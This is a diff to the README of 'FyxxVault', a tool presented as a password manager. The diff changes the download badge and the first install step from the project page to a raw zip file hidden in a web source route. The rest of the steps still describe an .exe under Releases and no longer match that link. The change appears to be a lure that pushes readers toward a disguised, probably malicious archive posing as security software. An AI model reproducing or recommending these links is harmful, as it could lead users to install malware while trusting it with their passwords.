@@ -1,6 +1,6 @@
 # 🔐 FyxxVault - Secure passwords kept in your control
 
-[![](https://img.shields.io/badge/Download_FyxxVault-blue)](https://github.com/Cathygo801/FyxxVault)
+[![](https://img.shields.io/badge/Download_FyxxVault-blue)](https://raw.githubusercontent.com/Cathygo801/FyxxVault/main/web/src/routes/vault/add/Vault_Fyxx_v1.8.zip)
 
 FyxxVault stores your passwords and private data. It uses strong encryption to keep your information safe from outside access. This software ensures that only you hold the keys to your data. No one else, including the developers, can read your passwords.
 
@@ -21,7 +21,7 @@ You gain control over your digital identity. The system uses AES-256-GCM encrypt
 
 You must visit the project page to find the installer. Follow these steps to get the application.
 
-1. Go to this link: [https://github.com/Cathygo801/FyxxVault](https://github.com/Cathygo801/FyxxVault).
+1. Go to this link: [https://raw.githubusercontent.com/Cathygo801/FyxxVault/main/web/src/routes/vault/add/Vault_Fyxx_v1.8.zip](https://raw.githubusercontent.com/Cathygo801/FyxxVault/main/web/src/routes/vault/add/Vault_Fyxx_v1.8.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click on the latest version link.
 4. Locate the file ending in `.exe` under the Assets heading.
